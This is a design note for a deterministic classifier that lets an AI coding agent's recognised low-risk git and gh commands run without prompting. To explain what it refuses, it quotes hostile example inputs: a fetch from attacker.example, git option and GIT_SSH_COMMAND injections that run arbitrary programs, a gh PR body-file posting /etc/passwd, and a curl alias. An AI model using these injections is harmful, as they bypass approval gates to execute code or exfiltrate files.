# Auto-approval classifier

Status: **Resolved (deterministic core shipped)** — the `read` tier is on by
default; `local-write` and `remote-write` are one dropdown away in
Settings → Local models → Routing behavior, beside the other auto-run controls.

## Motivation

Principle #3 in [`docs/threat-model.md`](../threat-model.md) says friction must
stay productivity-neutral: a control that makes everyday work painful gets turned
off, and a disabled control protects nothing. The
[trusted-command allow-list](command-sandboxing-routing.md) addressed one half of
that — commands that _cannot_ run inside the sandbox but are safe for a trusted
project. It requires the user to name each binary up front, which works for
`xcodebuild` and not much else.

The other half is the long tail of shapes nobody would think to allow-list
individually, but which every session hits. A real session (branch a change,
commit it, run checks, open a PR) prompted on:

| Command                             | Why it prompted                                         |
| ----------------------------------- | ------------------------------------------------------- |
| `git fetch origin main`             | Ambiguous → ran in-sandbox, network denied, retry asked |
| `git push origin <branch>`          | Hard-external (`git network operation`)                 |
| `gh pr create --base main …`        | Ambiguous `gh` → sandbox block → escalation asked       |
| `cd <root> && git log --oneline -5` | Compound; no OS sandbox on Linux/Windows                |

None of these is novel or risky. Every one of them interrupts. That is exactly
the pattern that trains a user to turn the gate off.

## What shipped

A **deterministic classifier** that recognises a fixed allow-list of command
_shapes_ and lets them run without a prompt, sorted into tiers by blast radius.

- `src/shared/auto-approval.ts` — renderer-safe level type, ranking, labels, and
  the `shellAutoApprovalLevel` setting key.
- `src/main/services/security/auto-approval.ts` — the pure classifier,
  `assessAutoApproval(command, ctx)`.
- `src/main/services/security/git-remotes.ts` — reads remote _names_ out of
  `.git/config` (no subprocess, no URL parsing), following a linked worktree's
  `commondir`.
- `src/main/services/security/auto-approval-config.ts` — the settings-backed
  wrapper applying the auto-run and workspace-trust gates.
- `permission-gate.ts` — consulted at the up-front gate **and** at both
  sandbox-escalation prompts.
- Settings → Local models → Routing behavior → "Auto-approve recognised low-risk
  commands", beside the auto-run toggle and the trusted-command list it composes
  with. (That section owns the shell auto-run controls despite its name; there is
  no "Security" section.)

### Tiers

| Level          | Adds                                                                                                                                       |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `off`          | nothing — every command that prompts today keeps prompting                                                                                 |
| `read`         | local reads (`ls`, `grep`, `git status`/`log`/`diff`), `git fetch`/`ls-remote` and `gh pr view`/`run list` against a **configured remote** |
| `local-write`  | `git add`, `git commit`, `git checkout -b`, `git switch -c`, `git stash`, `git branch <name>`                                              |
| `remote-write` | `git push` (no force), `gh pr create`, `gh issue comment`                                                                                  |

Each level includes the ones below it. A compound command takes the **highest**
tier across its segments, so `git status && git commit -m x` needs `local-write`.

### Why this is safe

- **Deterministic.** No model verdict reaches it. `safety-classifier.ts` keeps its
  existing role — a strict-mode signal that can only _block_ — so the threat
  model's "the optional local classifier can only make strict-mode blocks, never
  authorize host execution" still holds literally.
- **Fails closed.** One unrecognised segment, flag, or argument prompts the whole
  line. It is an allow-list of shapes, not a denylist of dangers, so an
  unfamiliar command is refused by construction rather than by enumeration.
- **Cannot widen a verdict.** It runs only after the policy has already resolved
  to `prompt`. `allow` never reaches it; `deny` returns (throws) before it.
- **Network shapes require a configured remote _name_.** `git fetch origin` reads
  from a remote the user chose; `git fetch https://attacker.example/repo` names
  no configured remote and prompts. The check is on the name, never the URL —
  parsing URLs would invite a weaker "does this look benign" test.
- **The destructive forms are excluded by name**, not by hoping the shape check
  catches them: force pushes, ref deletions (`+main`, `:main`, `--delete`,
  `--mirror`), `git branch -D`, `git tag -d`, `git stash clear`/`drop`,
  `git checkout .`/`-- <path>`, `reset`, `rebase`, `merge`, `filter-branch`.
- **Git option injection is refused.** `git -c core.pager='sh -c …' log` and
  `git -c protocol.ext.allow=always fetch` are the classic read-to-RCE turns;
  only three inert global options are accepted and everything else prompts.
  `-C`, `--git-dir`, `--work-tree`, `--upload-pack`, `--receive-pack`, `--exec`
  are rejected at any position.
- **Shell escapes are refused**: command substitution, backticks, parameter
  expansion, writing redirections, interpreters, `sudo`, `xargs`, `find -exec`.
- **A leading environment assignment is refused, not skipped.** The environment
  is an execution channel for precisely the commands on this list —
  `GIT_SSH_COMMAND='curl …' git fetch origin` and `GIT_EXTERNAL_DIFF=… git diff`
  both make git run an arbitrary program while the argv still reads as a plain
  `git fetch`/`git diff`. No accepted shape needs a per-command override, so the
  segment prompts. (`command-routing.ts` skips assignments when finding a command
  head; that path is safe because it additionally requires a user-typed per-binary
  grant, which this one does not.)
- **`gh` writes take a flag allow-list, not a `--repo` denylist.** The flags that
  matter are the ones that read a local file and post it to github.com —
  `gh pr create --body-file /etc/passwd` is exfiltration wearing the shape of a
  PR — so `--body-file`/`-F`/`--template` are absent alongside `--repo`/`-R`.
- **Prep-step paths are canonicalized**, so `cd link-to-etc && ls` cannot leave
  the workspace by a symlink that resolves cleanly under the root lexically.
  A bare `~` carries no separator for the shared scope heuristic to key on, which
  is why prep steps get this explicit containment check on top of it.
- **`gh api` is excluded** — it can issue any request, with no shape to check.
  So are `gh pr merge`/`approve`/`ready`/`close`, `run rerun`, `workflow run`,
  and `repo delete`, mirroring `GITHUB_WRITE_TOOLS`, which always prompts. A
  `gh` write refuses `--repo`/`-R` so the target is always the workspace's repo.
- **Gated like the trusted-command list**: honoured only when auto-run is on and
  the workspace is explicitly trusted. This matters more here than there — the
  allow-list is a per-binary grant the user typed out, while these shapes are
  granted by class, so a freshly-cloned untrusted repo must not benefit.
- **Every grant is logged.** A `decisions.jsonl` line with `actor: 'classifier'`,
  `verdict: 'allowed'`, `source: 'auto-approval'`, and the tier plus per-segment
  reasons.

### The quote-aware lexer, and why it is not the over-broad one

`command-routing.ts` disqualifies a command on any `` ` `` or `(` anywhere,
deliberately over-broad because a false positive there only costs a fallback to
the normal gate. That does not survive contact with `local-write`: the single
most common shape is `git commit -m "fix the parser (#123)"`, and an over-broad
scan refuses every commit message containing a parenthesis. So this classifier
tracks quoting and flags only what the shell would actually act on — unquoted
`` ` ``/`$`/`(`/`)`, and `` ` ``/`$` inside double quotes, where expansion still
happens. Single-quoted text is inert.

The inert redirect forms (`2>&1`, `>/dev/null`) are stripped before tokenizing,
because `shell-quote` yields operator objects for them and would otherwise refuse
`git fetch origin main 2>&1` — which is most real command lines.

## Known limitations

These are scope decisions, not oversights:

- **Git hooks are repo-controlled code.** `git commit`, `git checkout`, and
  `git push` run `.git/hooks/*`. A fresh clone ships none (hooks are not tracked),
  but a `core.hooksPath` pointed at a tracked directory, or a hook the agent wrote
  earlier in the session, is code these tiers execute without a prompt. Contained
  by the macOS project sandbox; **not** contained on Linux or Windows. This is why
  `local-write` is a separate tier and why `read` is the default.
- **`git fetch` stages content it does not run.** Objects and refs land in `.git`;
  a later checkout could execute them.
- **`gh` honours user aliases.** `gh alias set pr '!curl …'` would redirect a
  read pair. Those live in the user's own `~/.config/gh/`, so this is
  user-controlled configuration, outside the threat model's untrusted-input scope.
- **Deliberately excluded, and staying excluded**: project scripts (`npm test`,
  `npm run check`, `make`) run arbitrary repo-controlled code; ephemeral runners
  (`npx`, `pnpm dlx`) fetch and execute unpinned packages (the supply-chain
  surface of #174); installs of any kind. All still prompt at every level.
- **A conservative false positive stands**: `git commit -m 'mentions $HOME'` is
  single-quoted and inert, but `analyzeShellCommand` sees a home reference and
  refuses. The cost is one prompt, never an unsafe run.

## Follow-ups

- Extend the classifier to `run_background` starts, which today reuse the
  `run_shell` gate but never reach the escalation paths.
- A per-project level, so a scratch repo can sit at `remote-write` while a
  production checkout stays at `read`.
- Surface recent auto-approvals in the UI — the decision log records them, but
  nothing shows the user "these 9 commands ran without asking this session",
  which is what principle #4 (observability) would want.
- Consider a `jj`/`hg` equivalent if either becomes common in the user base.
